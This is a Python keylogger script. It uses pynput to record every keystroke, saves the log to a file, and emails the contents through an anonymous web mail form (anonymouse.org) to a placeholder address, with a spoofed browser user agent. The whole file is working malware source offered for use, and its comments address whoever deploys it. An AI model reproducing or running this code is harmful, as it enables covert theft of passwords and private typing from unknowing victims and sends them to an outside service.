# pip3 install pynput
# pip3 install mechanize

from pynput import keyboard
from pynput.keyboard import Key, Listener
from datetime import datetime
import smtplib
import mechanize

log = ""

def on_press(key):
    global log
    #if character is letter or number
    try:
        log += key.char
    #if is a special character
    except AttributeError:
        if key is keyboard.Key.space:
            log += " "
        if key is keyboard.Key.backspace:
            log = log[:len(log) - 1]
        if key is keyboard.Key.enter:
            log += "\n"
        if key is keyboard.Key.tab:
            log += "\t"
    #condition for close the program or not ;)
    #here you change how often your log is updated
    if key is keyboard.Key.esc:
        save_to_file(log,datetime.now())
        construct_mail('log.txt')
        quit()

#create or update log file
def save_to_file(str_log, dtt):
    log_file = open('log.txt','a+')
    log_file.write("\n[" + str(dtt) + "]:\n" + str_log + "\n")
    log_file.close()
    print("log updated!")

def construct_mail(file_to_send):
    f = open(file_to_send,'r+')
    message = f.read()
    f.close()
    send_mail("your_mail@any.any","keylogger_log",message)
    print("log send to email!")

def send_mail(to, subject, message):

    br = mechanize.Browser()

    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_debug_http(False)
    br.set_debug_redirects(False)

    url = "http://anonymouse.org/anonemail.html"
    headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
    br.addheaders = [('User-agent', headers)]
    br.open(url)

    br.select_form(nr=0)

    br.form['to'] = to
    br.form['subject'] = subject
    br.form['text'] = message

    result = br.submit()
    response = br.response().read()
    #print(response)

with Listener(on_press=on_press) as listener:
    listener.join()
